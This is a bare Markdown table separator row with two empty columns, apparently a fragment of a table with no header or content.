| --- | --- |
